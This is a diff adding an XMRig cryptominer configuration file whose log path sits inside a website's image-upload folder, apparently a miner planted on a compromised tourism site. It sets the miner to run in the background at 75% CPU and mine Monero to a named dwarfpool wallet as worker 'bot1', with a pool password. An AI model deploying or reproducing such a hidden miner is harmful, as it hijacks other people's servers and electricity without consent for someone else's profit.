@@ -1,0 +1,31 @@
+{
+    "algo": "cryptonight",
+    "background": true,
+    "colors": true,
+    "retries": 5,
+    "retry-pause": 5,
+    "donate-level": 0,
+    "syslog": false,
+    "log-file": "/data/hosting/tourism.303030.kz/htdocs_vkn/uploads/img/img/xmr/xmrig252/x252.log",
+    "print-time": 60,
+    "av": 0,
+    "safe": false,
+    "max-cpu-usage": 75,
+    "cpu-priority": null,
+    "threads": null,
+    "pools": [
+        {
+            "url": "xmr-eu.dwarfpool.com:8005",
+            "user": "48jNbzBLAeej3gnEovyFZrEhMg8fkGieTP64Vef8LcnnR7Kg64aswsMP2uJLJG8nBScA7Cqc4ccb1hvGSbMzSwz7MzuMZmZ.bot1",
+            "pass": "s320372008",
+            "keepalive": true,
+            "nicehash": false,
+            "variant": -1
+        }
+    ],
+    "api": {
+        "port": 0,
+        "access-token": null,
+        "worker-id": null
+    }
+}
